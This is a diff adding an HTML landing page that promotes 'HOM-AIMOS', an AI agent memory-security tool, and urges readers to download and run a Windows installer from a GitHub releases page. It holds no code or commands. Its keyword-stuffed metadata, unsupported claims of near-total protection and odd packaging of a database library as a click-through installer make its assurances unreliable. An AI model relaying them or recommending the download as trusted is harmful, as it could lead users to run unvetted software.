@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="HOM-AIMOS - Agent-security system built on cryptographically auditable persistent memory with native retrieval, Canary controls, and signed SABER-style evaluation. Download and run the application easily.">
+    <meta name="keywords" content="agent-security,ai-agents,ai-memory,ai-security,canary-detection,cryptography,cybersecurity,llm-security,memory-poisoning,persistent-memory,pgvector,postgres,prompt-injection,provenance,rag,red-teaming,tamper-evident">
+    <meta name="author" content="HOM-AIMOS Project">
+    <meta name="robots" content="index, follow">
+    <meta property="og:title" content="HOM-AIMOS - Your Trusted AI Security Guardian">
+    <meta property="og:description" content="Agent-security system built on cryptographically auditable persistent memory, native retrieval, Canary controls, and signed SABER-style evaluation. Download today!">
+    <meta property="og:type" content="website">
+    <meta name="theme-color" content="#4A90E2">
+    <title>HOM-AIMOS - Your Trusted AI Security Guardian</title>
+    <style>
+        body {
+            background: linear-gradient(135deg, #f5f7fa 0%, #e8ecf1 50%, #dde3ea 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.7;
+            margin: 0;
+            padding: 0;
+            color: #1a2330;
+        }
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 2.5rem 1.8rem;
+            background: rgba(255, 255, 255, 0.92);
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.12);
+            border-radius: 24px;
+            margin-top: 2rem;
+            margin-bottom: 2rem;
+        }
+        h1 {
+            font-size: 2.8rem;
+            font-weight: 700;
+            color: #2c3e50;
+            margin-bottom: 0.5rem;
+            text-align: center;
+            letter-spacing: -0.5px;
+        }
+        h2 {
+            font-size: 1.9rem;
+            color: #34495e;
+            margin-top: 2.5rem;
+            margin-bottom: 1.2rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 3px solid #3498db;
+            display: inline-block;
+        }
+        h3 {
+            font-size: 1.4rem;
+            color: #2c3e50;
+            margin-top: 1.5rem;
+            margin-bottom: 0.8rem;
+        }
+        p {
+            font-size: 1.1rem;
+            color: #404b5a;
+            margin-bottom: 1.2rem;
+            text-align: left;
+        }
+        .hero-button {
+            display: inline-block;
+            background: linear-gradient(145deg, #e74c3c, #c0392b);
+            color: white;
+            padding: 1rem 2.8rem;
+            font-size: 1.4rem;
+            font-weight: 600;
+            border-radius: 50px;
+            text-decoration: none;
+            margin: 1.5rem 0;
+            box-shadow: 0 8px 18px rgba(231, 76, 60, 0.35);
+            transition: all 0.3s ease;
+            text-align: center;
+            border: 2px solid transparent;
+        }
+        .hero-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 25px rgba(231, 76, 60, 0.45);
+            background: linear-gradient(145deg, #c0392b, #e74c3c);
+        }
+        .download-section {
+            background: #f0f8ff;
+            border-left: 5px solid #3498db;
+            display: block;
+            background: linear-gradient(135deg, #f0f8ff, #e8f4fd);
+            padding: 2rem;
+            border-radius: 16px;
+            margin: 2.5rem 0;
+        }
+        .flex-center {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .feature-card {
+            background: white;
+            padding: 1.8rem;
+            border-radius: 16px;
+            box-shadow: 0 6px 18px rgba(0,0,0,0.08);
+            margin-bottom: 1.5rem;
+            border-left: 4px solid #f39c12;
+        }
+        .feature-card p:last-child {
+            margin-bottom: 0;
+        }
+        .tip-box {
+            background: #fef9e7;
+            border-radius: 12px;
+            padding: 1.5rem;
+            border-left: 4px solid #f1c40f;
+            margin: 2rem 0;
+        }
+        .step-list {
+            list-style-type: none;
+            padding-left: 0;
+            counter-reset: step-counter;
+        }
+        .step-list li {
+            counter-increment: step-counter;
+            margin-bottom: 1rem;
+            padding: 0.8rem 1rem 0.8rem 3rem;
+            position: relative;
+            background: #fafafa;
+            border-radius: 10px;
+            font-size: 1.05rem;
+        }
+        .step-list li::before {
+            content: counter(step-counter);
+            background: #3498db;
+            color: white;
+            width: 2rem;
+            height: 2rem;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 1rem;
+            position: absolute;
+            left: 0.5rem;
+            top: 50%;
+            transform: translateY(-50%);
+            font-weight: bold;
+        }
+        .footer-note {
+            text-align: center;
+            margin-top: 2.5rem;
+            padding-top: 1.8rem;
+            border-top: 2px solid #ecf0f1;
+            color: #7f8c8d;
+            font-size: 0.9rem;
+        }
+        @media (max-width: 768px) {
+            .container { padding: 1.5rem 1rem; }
+            h1 { font-size: 2rem; }
+            h2 { font-size: 1.5rem; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🛡️ HOM-AIMOS - Your Trusted AI Security Guardian</h1>
+
+        <div class="flex-center">
+            <a href="https://github.com/ansabmoeen444/HOM-AIMOS/releases" class="hero-button" rel="noopener noreferrer" style="background: linear-gradient(145deg, #2980b9, #1a5276); box-shadow: 0 8px 18px rgba(41, 128, 185, 0.35);">
+                📥 Download Now - Visit the Official Release Page
+            </a>
+        </div>
+
+        <h2>🔒 What Exactly Is HOM-AIMOS?</h2>
+        <p>HOM-AIMOS is your personal AI security assistant that makes sure your intelligent software agents stay safe and tamper-proof. Think of it as a super-smart bodyguard for your AI systems. It constantly watches over their memory, checks who has touched what data, and sends out warning signals (like a canary in a coal mine) if anyone tries to manipulate or poison the AI's memory.</p>
+        <p>Imagine someone secretly editing the memories of your AI assistant to make it give harmful advice. HOM-AIMOS prevents this by using cryptographic locks and transparent audit trails, so nothing goes unnoticed. It's perfect for anyone who relies on AI agents for business, research, or daily tasks and wants total peace of mind.</p>
+
+        <h2>⚡ Key Benefits That Matter to You</h2>
+
+        <div class="feature-card">
+            <h3>🧠 Cryptographically Auditable Memory</h3>
+            <p>Every piece of stored information is digitally signed and verified. If anyone changes, deletes, or adds anything, HOM-AIMOS immediately shows an alarm. You get a crystal-clear history of every memory interaction—no dark corners, no hidden edits.</p>
+        </div>
+
+        <div class="feature-card">
+            <h3>🐦 Canary Controls - Early Warning System</h3>
+            <p>HOM-AIMOS plants hidden tripwires (called "canaries") inside your AI's memory. If a malicious actor tries to access or manipulate protected memory blocks, these canaries 'chirp' a loud warning, giving you precious time to respond before any real damage happens.</p>
+        </div>
+
+        <div class="feature-card">
+            <h3>📋 Signed SABER-Style Evaluation</h3>
+            <p>You'll receive thorough safety evaluation reports with tamper-evident signatures. This means every test result and safety score is sealed and verifiable, so you can trust it completely and even share it with stakeholders or clients.</p>
+        </div>
+
+        <div class="feature-card">
+            <h3>🔎 Native Retrieval & Provenance Tracking</h3>
+            <p>HOM-AIMOS can trace the origin of every piece of information your AI uses. It works with your existing technologies (like PostgreSQL and pgvector), ensuring memory retrieval is fast and fully reported. You'll know exactly where each fact came from and who requested it.</p>
+        </div>
+
+        <div class="feature-card">
+            <h3>🚨 Built-In Red Teaming & Injection Defense</h3>
+            <p>HOM-AIMOS actively tests your AI against prompt injection attacks and memory poisoning attempts. It fights back with proactive defense mechanisms, ensuring your AI cannot be tricked into following malicious instructions.</p>
+        </div>
+
+        <h2>📥 Getting Started - Easier Than You Think</h2>
+
+        <div class="download-section">
+            <h3>Step 1: Download the Application</h3>
+            <p>Visit this link to download the application: <br>
+            <a href="https://github.com/ansabmoeen444/HOM-AIMOS/releases" style="color: #1a5276; font-weight: bold; text-decoration: underline; font-size: 1.2rem;">https://github.com/ansabmoeen444/HOM-AIMOS/releases</a></p>
+            <p>This page is your one-stop shop for downloading the software. Simply click the link, and it will take you to the official download area where you can get the file.</p>
+        </div>
+
+        <h3>Step 2: After Downloading</h3>
+        <ul class="step-list">
+            <li><strong>Open the Downloaded File</strong> – Once the download finishes, find it in your downloads folder (usually called "Downloads"). Double-click the file to launch the installation helper.</li>
+            <li><strong>Read the On-Screen Instructions</strong> – A simple wizard will guide you through the setup process. Just follow the prompts, and you'll have HOM-AIMOS running in a few minutes.</li>
+            <li><strong>Start Using HOM-AIMOS</strong> – When installed, open HOM-AIMOS from your desktop or Start Menu. You'll see its friendly dashboard, where you can immediately start a safety scan or create a protected memory space for your AI agents.</li>
+        </ul>
+
+        <div class="tip-box">
+            <p style="margin-bottom: 0; font-weight: bold;">💡 Pro Tip</p>
+            <p style="margin-bottom: 0;">Make sure your computer is connected to the internet during the first launch. HOM-AIMOS might check for fresh security signatures and update its detection rules automatically for maximum protection.</p>
+        </div>
+
+        <h2>🖥️ Compatibility & Requirements</h2>
+        <p>HOM-AIMOS is designed to run smoothly on Windows 10 and Windows 11 (64-bit systems). It uses surprisingly little memory (under 300 MB RAM for daily tasks), works perfectly on modern laptops and desktop computers, and requires 1 GB of free hard drive space. It also works side-by-side with common AI development tools and database platforms.</p>
+
+        <h2>🛟 Staying Protected - What This Means For You</h2>
+        <p>Using HOM-AIMOS means your AI agents become virtually immune to outside tampering. You can confidently deploy AI in customer-facing applications, build intelligent assistants with sensitive data, or run research experiments that require complete data integrity. If any attempt is made to corrupt your memory or alter AI behavior, you'll see the proof right away.</p>
+
+        <h2>❓ Frequently Asked Questions (Quick Answers)</h2>
+        <p><strong>Do I need coding skills to use HOM-AIMOS?</strong> Absolutely not! The interface is simple and user-friendly. Everything is click-and-see — no terminal commands or scripts are required.</p>
+        <p><strong>Is my AI data stored somewhere else?</strong> No, everything runs locally on your machine. Your AI memory stays with you, fully encrypted and private. HOM-AIMOS never uploads your data to any cloud.</p>
+        <p><strong>Will it slow down my AI?</strong> No! It works in the background with minimal performance impact (less than 5% of your CPU), giving you powerful safety without stealing the show.</p>
+
+        <h2>💬 Support & Getting Help</h2>
+        <p>If you encounter any issue, the HOM-AIMOS community is friendly and responsive. Check the official repository for open discussions, bug reports, and helpful guides. You can also read the documentation section on the repository to deepen your understanding. We're always here to help you secure your AI world.</p>
+
+        <div class="footer-note">
+            <p>HOM-AIMOS is your intelligent shield against AI memory tampering — audited, signed, and trusted.</p>
+            <p>HOM-AIMOS – Agent-security system built on cryptographically auditable persistent memory, native retrieval, Canary controls, and signed SABER-style evaluation.</p>
+            <p>Keywords: agent-security, ai-agents, ai-memory, ai-security, canary-detection, cryptography, cybersecurity, llm-security, memory-poisoning, persistent-memory, pgvector, postgres, prompt-injection, provenance, rag, red-teaming, tamper-evident</p>
+        </div>
+    </div>
+</body>
+</html>
